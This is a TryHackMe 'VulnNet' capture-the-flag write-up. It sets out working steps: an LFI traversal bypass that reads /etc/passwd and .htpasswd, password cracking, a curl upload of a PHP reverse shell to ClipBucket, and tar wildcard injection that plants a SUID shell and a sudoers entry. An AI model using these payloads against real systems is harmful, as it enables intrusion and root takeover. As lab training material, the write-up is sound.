# Try Hack Me - VulnNet
# Author: Atharva Bordavekar
# Difficulty: Medium
# Points: 60
# Vulnerabilities: LFI, cronjob abuse via tar wildcard injection

# Phase 1 - Reconnaissance:

first lets add the hostname in our /etc/hosts file
```bash
echo "<target_ip> /etc/hosts" | sudo tee -a /etc/hosts
```
nmap scan:
```bash
nmap -p- --min-rate=1000 <target_ip>
```
PORT   STATE SERVICE

22/tcp open  ssh

80/tcp open  http

lets enumerate the webpage at the port 80 to find any leads. using gobuster, i did not find anything interesting. in the top right corner, i found a sign in page. i accessed it at /login.html. tried defualt credentials, hydra bruteforcing with the username admin, multiple sql injections but none of that worked. after an hour of manual enumeration all i found was dead ends.

i remembered one crucial thing that whenever there is a hostname given in a CTF, always scan for the virtual hosts/ subdomains. we will use ffuf to carry out the virtual host enumeration.

```bash
ffuf -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-5000.txt:FUZZ -u http://vulnnet.thm/ -H 'Host: FUZZ.vulnnet.thm' -fs  5829
```
`NOTE: make sure you filter out the default page size which is 5829 bytes`

![image0](https://github.com/realatharva15/vulnnet_writeup/blob/main/images/subdomainbetter.png)

we get a hit at broadcast.vulnnet.thm!!! lets add it to our /etc/hosts file

```bash
echo "<target_ip> broadcast.vulnnet.thm" | sudo tee -a /etc/hosts
```
it asks us for some credentials. we cannot bypass this basic auth. lets continue with the enumeration. 

lets use zaproxy to automate the scanning process. 

```bash
zaproxy
```

we will set the target url to http://vulnnet.thm, activvate ajax spider and attack the website. after sometime we find a highly critical vulnerability at the location /index.php?referer

![image1](https://github.com/realatharva15/vulnnet_writeup/blob/main/images/zap.png)

we find an LFI!!! using this it is possible to view the files on the system. we can view the /etc/passwd file.

```bash
http://vulnnet.thm/index.php/?referer=..//..//..//..//etc/passwd
```

![image2](https://github.com/realatharva15/vulnnet_writeup/blob/main/images/LFI.png)

important thing to note here is that we wouldn't have noticed this file inclusion vulnerability without zaproxy since the output is revealed in the source code only and does not get displayed on the main page since it is not inside any html tags.
lets use this to view the /index.php file to find any sanitizations carried out by the devs to avoid LFI.
```bash
http://vulnnet.thm/index.php/?referer=..//..//..//..//index.php
```
we find this block of code in the index.php which is used as a security measure against LFI

```bash
<?php
$file = $_GET['referer'];
$filter = str_replace('../','',$file);
include($filter);
?>
```
we can easily bypass this security feature by using something like "..//..//..//..//" which i 

now remember we had to find some credentials? i remember that we can possibly access the .htpasswd file we found using gobuster. lets use the same LFI to get the contents of the file. but first we will have to do some google dorking to find the default location of the .htpasswd file

![image3](https://github.com/realatharva15/vulnnet_writeup/blob/main/images/googledorking.png)

we finally have the path to the .htpasswd file, now lets access this via the browser and then view the source code.

```bash
http://vulnnet.thm/index.php/?refered=..//..//..//..//etc/apache2/.htpasswd
```
![image4](https://github.com/realatharva15/vulnnet_writeup/blob/main/images/htpasswd.png)

now we can see some credentials in the source code. lets use them at the login page at the http://broadcast.vulnnet.thm url, since it is a password hash, we will first crack it using john the ripper

save the password hash inside a file named dev_hash.txt

```bash
john --wordlist=/usr/share/wordlists/rockyou.txt dev_hash.txt
```
after a couple of minutes, we find the cracked password.

![image5](https://github.com/realatharva15/vulnnet_writeup/blob/main/images/johnny1.png)

we use it at the login page. now we can see a website named "ClipBucket".

![image](https://github.com/realatharva15/vulnnet_writeup/blob/main/images/Screenshot%202026-01-22%20at%2016-33-12%20-.png)

in the source code, we find the exact version which is 4.0

![image6](https://github.com/realatharva15/vulnnet_writeup/blob/main/images/Screenshot%202026-01-22%20at%2016-37-04%20http%20__broadcast.vulnnet.thm_signup.php.png)

lets use searchsploit to get some exploits for this specific version of ClipBucket. 

```bash
searchsploit clipbucket
```
lets use the last exploit which is a guide on how to manually exploit this vulnerability. 

```bash
searchsploit clipbucker -m php/webapps/44250.txt
```
after using the help of AI, i found out that the best bet at getting a revershell was by uploading a reverseshell using curl by including the credentials we found earlier to pass the basic auth. lets first copy a reverseshell to our current directory from the /usr/share/webshells/php/reverseshell/ directory. once the shell is in our current directory, we can perform the reverseshell upload.

```bash
#first setup a netcat listner:
nc -lnvp 4444
```
now use this payload to upload the reverseshell on the system.

```bash
curl -u developers:< REDACTED > \
     -F "file=@shell.php" \
     -F "plupload=1" \
     -F "name=shell.php" \
     "http://broadcast.vulnnet.thm/actions/beats_uploader.php"
```
we will get a message like this:

{"success":"yes","file_name":"1769093349d8bd5e","extension":"php","file_directory":"CB_BEATS_UPLOAD_DIR"} 

this means that we have successfully uploaded the shell.php file, and we just have to traverse to the /actions/CB_BEATS_UPLOAD_DIR/1769093349d8bd5e.php location in order to trigger the shell.

```bash
#in your browser:
http://broadcast.vulnnet.thm/actions/CB_BEATS_UPLOAD_DIR/1769093349d8bd5e.php
```
`NOTE: the filename of your reverseshell might be differ, for me it was 1769093349d8bd5e.php. change the url accordingly`

now we can see that we recieve a shell as www-data! lets quickly enumerate the system manually then we will move on with executing linpeas.sh on the system. we find a /etc/crontab running on the system which is owned by root. lets start running linpeas on the target machine.

using linpeas.sh we find an interesting backup file at /var/backups/ssh-backup.tar.gz. lets transfer it to our attacker machine by using a python listner

```bash
#on your target machine, setup a listener in the /var/backups directory:
python3 -m http.server 8000
```
```bash
#on your attacker machine:
wget http://<target_machine>:8000/ssh-backup.tar.gz
```
now we have the backup file on our machine. lets use tar to find out its contents

```bash
tar ssh-backup.tar.gz
```
we find out an id_rsa file which is encrypted. lets use ssh2john to convert it into a has and then bruteforce the hash using john the ripper.

```bash
ssh2john id_rsa > id_rsa_hash
```
the hash should look something like this: id_rsa:$sshng$1$16$6CE1A97A.......

```bash
john --wordlist=/usr/share/wordlists/rockyou.txt id_rsa_hash
```
we get the passphrase of the id_rsa after a couple of minutes. lets use the -i flag to access the ssh shell as server-management.

![image7](https://github.com/realatharva15/vulnnet_writeup/blob/main/images/johnnny.png)

```bash
#first give the id_rsa the required permissions:
chmod 600 id_rsa
```
```bash
ssh -i id_rsa server-management@<target_ip>
#enter the passphrase when prompted
```
now we will find out the contents of the /var/opt/backupsrv.sh script which runs as root as cronjob within every 2 minutes.

```bash
#!/bin/bash

# Where to backup to.
dest="/var/backups"

# What to backup. 
cd /home/server-management/Documents
backup_files="*"

# Create archive filename.
day=$(date +%A)
hostname=$(hostname -s)
archive_file="$hostname-$day.tgz"

# Print start status message.
echo "Backing up $backup_files to $dest/$archive_file"
date
echo

# Backup the files using tar.
tar czf $dest/$archive_file $backup_files

# Print end status message.
echo
echo "Backup finished"
date

# Long listing of files in $dest to check file sizes.
ls -lh $dest
```
we can clearly see that the shell is using the tar command to backup the files present in the /home/server-management/Documents. we can exploit this using tar wildcard injection. after researching on this topic i found out we can execute our own malicious file via the cronjob which will run as root! 

```bash
#first create a malicious script 
cat > exploit.sh << 'EOF'
> #!/bin/bash
> cp /bin/bash /tmp/rootbash
> chmod 4755 /tmp/rootbash
> echo "server-management ALL=(ALL) NOPASSWD:ALL" >> /etc/sudoers 2>/dev/null
> EOF
```
```bash
#now give make the script executable
chmod +x exploit.sh
```
now once we have created the exploit.sh script, we will have to create two more files which will be percieved by tar to execute the file exploit.sh. the explanation of the vulnerability is explained beuatifuly by DeepSeek :

```bash
Tar Checkpoint Exploit Explained
The Vulnerability

When tar processes files using wildcards (*), it treats all filenames as arguments. Filenames starting with -- are interpreted as command options, not files to archive.
The Exploit Files

File 1: --checkpoint=1

    Tells tar to create checkpoints every 1 file processed

    This enables checkpoint actions to trigger

File 2: --checkpoint-action=exec=bash exploit.sh

    Tells tar what to execute at each checkpoint

    When tar sees this filename, it runs: bash exploit.sh

    The entire filename becomes a tar command argument

How It Works

    Script runs: tar czf backup.tgz *

    * expands to all files including our specially named ones

    Tar interprets them as arguments:
    

tar czf backup.tgz --checkpoint=1 --checkpoint-action=exec=bash exploit.sh

    At checkpoint 1, tar executes bash exploit.sh as root

    Our exploit.sh creates SUID bash shell in /tmp

Why It's Dangerous

    Cron runs the script as root

    Tar executes our commands with root privileges

    We get full system access via the SUID shell

Lesson: Never use wildcards with tar in untrusted directories!
```

now we will create the two files:

```bash
#create the first file
: > '--checkpoint=1'  

#create the second file:
: > '--checkpoint-action=exec=bash exploit.sh'
```
now we wait for 2 minutes for the cronjob to do its thing. after two minutes we can find out that the user server-management has been added to the /etc/sudoers file. 

```bash
sudo su
```
we get a shell as root and we finally read and submit the root.txt flag.
